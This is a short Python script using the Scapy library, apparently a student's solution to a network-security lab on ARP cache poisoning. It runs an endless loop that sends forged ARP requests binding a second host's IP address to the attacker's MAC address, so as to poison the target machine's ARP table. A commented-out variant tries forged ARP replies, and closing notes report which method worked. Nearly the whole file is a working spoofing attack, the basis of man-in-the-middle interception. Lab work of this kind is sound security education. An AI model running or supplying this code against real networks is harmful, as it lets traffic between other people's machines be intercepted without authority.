# create ARP request packet and send it to the target machine to fake the MAC address of the attacker

from scapy.all import *

IP_B = "192.168.24.77"
MAC_ATTACKER = "02:42:0a:09:00:71"

IP_A = "192.168.24.9"


while True:
    
#### Task 1.A ####
    E = Ether()
    E.src = MAC_ATTACKER

    A = ARP()
    A.psrc = IP_B
    A.pdst = IP_A
    A.hwsrc = MAC_ATTACKER
    # A.hwdst = "00:00:00:00:00:00"
    A.op = 1

    pkt = E/A

    sendp(pkt)
    time.sleep(5)


#### Task 1.B ####
# E = Ether()
# E.src = MAC_ATTACKER

# A = ARP()
# A.psrc = IP_B
# A.pdst = IP_A
# A.hwsrc = MAC_ATTACKER
# A.op = 2

# pkt = E/A
# send(pkt)

## Conclusion
# The ARP request packet is sent to the target machine to fake the MAC address of the attacker. The target machine will update its ARP table with the MAC address of the attacker.
# But using ARP reply packet is doesn't work. The target machine will not update its ARP table with the MAC address of the attacker.
